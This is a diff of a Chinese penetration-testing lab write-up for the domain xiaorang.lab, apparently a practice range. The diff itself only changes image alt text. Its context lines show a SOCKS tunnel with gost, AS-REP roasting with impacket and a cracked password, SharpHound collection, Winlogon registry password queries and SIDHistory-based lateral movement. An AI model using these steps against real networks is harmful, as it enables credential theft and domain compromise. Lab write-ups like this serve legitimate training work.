@@ -112,7 +112,7 @@ nohup ./gost -L=socks://:1080 > gost.log 2>&1 &
 ss -luntp
 ```
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 ```bash
 POST /index.php HTTP/1.1
@@ -471,7 +471,7 @@ if __name__ == "__main__":
 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile usernames.txt xiaorang.lab/
 ```
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 得到hash
 
@@ -486,7 +486,7 @@ zhangxin@xiaorang.lab
 strawberry
 ```
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 发现是域用户，进行域内信息收集，
 
@@ -497,7 +497,7 @@ SharpHound.exe -c all
 
 `query user`发现有其他用户会话
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 查询注册表看看存没存默认的用户密码
 
@@ -511,7 +511,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 
 现在来看看域内信息图
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 > The user YUXUAN@XIAORANG.LAB has, in its SIDHistory attribute, the SID for the user ADMINISTRATOR@XIAORANG.LAB.userYUXUAN@XIAORANG.LAB 
 >
@@ -525,7 +525,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 
 登录yuxuan，看看用户组`whoami /groups`
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 直接横向即可
 
